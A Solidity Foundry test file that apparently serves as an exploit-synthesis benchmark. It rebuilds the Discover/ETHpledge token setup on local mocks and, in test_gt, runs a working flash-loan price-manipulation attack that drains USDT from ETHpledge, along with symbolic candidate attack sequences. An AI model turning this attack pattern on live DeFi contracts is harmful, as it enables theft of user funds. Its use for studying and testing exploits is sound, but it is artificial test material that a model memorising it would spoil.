// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./Discover.sol";
import "./ETHpledge.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract DiscoverTest is Test, BlockLoader {
    USDT usdt;
    Discover disc;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    ETHpledge ethpledge;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address discAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address ethpledgeAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1654501818;
    uint112 reserve0pair = 19811554285664651588959;
    uint112 reserve1pair = 12147765912566297044558;
    uint32 blockTimestampLastpair = 1654497610;
    uint256 kLastpair = 240657614061763162729453454536640212219454075;
    uint256 price0CumulativeLastpair = 2745108143450717659830230984376055006264;
    uint256 price1CumulativeLastpair = 5093292101492579051002459678125122695956;
    uint256 totalSupplydisc = 99999771592634687573343730;
    uint256 balanceOfdiscpair = 12147765912566297044558;
    uint256 balanceOfdiscattacker = 0;
    uint256 balanceOfdiscdisc = 0;
    uint256 balanceOfdiscethpledge = 603644007472699128296549;
    uint256 totalSupplyusdt = 4979997922172658408539526181;
    uint256 balanceOfusdtpair = 19811554285664651588959;
    uint256 balanceOfusdtattacker = 4000000000000000000;
    uint256 balanceOfusdtdisc = 0;
    uint256 balanceOfusdtethpledge = 17359200000000000000000;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        disc = new Discover();
        discAddr = address(disc);
        pair = new UniswapV2Pair(
            address(usdt),
            address(disc),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        ethpledge = new ETHpledge(
            address(usdt),
            address(disc),
            address(0xdead),
            address(0xdead),
            address(pair)
        );
        ethpledgeAddr = address(ethpledge);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        disc.transfer(address(pair), balanceOfdiscpair);
        usdt.transfer(address(ethpledge), balanceOfusdtethpledge);
        disc.transfer(address(ethpledge), balanceOfdiscethpledge);
        usdt.transfer(address(attackContract), balanceOfusdtattacker);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(usdt),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Disc Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(disc),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(disc),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(pair),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Ethpledge Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(ethpledge),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(ethpledge),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attackContract),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(attackContract),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_owner_disc(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        disc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_disc(uint256 amount) internal {
        disc.transfer(owner, amount);
    }

    function borrow_pair_usdt(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_usdt(uint256 amount) internal {
        usdt.transfer(address(pair), amount);
    }

    function borrow_pair_disc(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        disc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_disc(uint256 amount) internal {
        disc.transfer(address(pair), amount);
    }

    function swap_pair_usdt_disc(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(disc);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_disc_usdt(uint256 amount) internal {
        disc.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(disc);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function swap_ethpledge_usdt_disc(uint256 amount) internal {
        usdt.approve(address(ethpledge), UINT256_MAX);
        ethpledge.pledgein(amount);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_owner_disc(24000e18);
        printBalance("After step0 ");
        swap_pair_disc_usdt(disc.balanceOf(attacker));
        printBalance("After step1 ");
        swap_ethpledge_usdt_disc(5000e18);
        printBalance("After step2 ");
        payback_owner_disc((24000e18 * 1003) / 1000);
        printBalance("After step3 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_ethpledge_usdt_disc(amt2);
        payback_owner_disc(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.assume(amt1 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        payback_owner_usdt(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.assume(amt1 == (amt0 * 1003) / 1000);
        borrow_owner_disc(amt0);
        payback_owner_disc(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.assume(amt1 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        payback_pair_usdt(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.assume(amt1 == (amt0 * 1003) / 1000);
        borrow_pair_disc(amt0);
        payback_pair_disc(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.assume(amt1 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        sync_pair();
        payback_owner_usdt(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_disc(amt0);
        swap_pair_disc_usdt(amt1);
        payback_owner_disc(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.assume(amt1 == (amt0 * 1003) / 1000);
        borrow_owner_disc(amt0);
        sync_pair();
        payback_owner_disc(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.assume(amt1 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        sync_pair();
        payback_pair_usdt(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_disc(amt0);
        swap_pair_disc_usdt(amt1);
        payback_pair_disc(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.assume(amt1 == (amt0 * 1003) / 1000);
        borrow_pair_disc(amt0);
        sync_pair();
        payback_pair_disc(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_disc(amt1);
        swap_pair_disc_usdt(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_ethpledge_usdt_disc(amt1);
        swap_pair_disc_usdt(amt2);
        payback_owner_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_pair_usdt_disc(amt2);
        payback_owner_disc(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_ethpledge_usdt_disc(amt2);
        payback_owner_disc(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
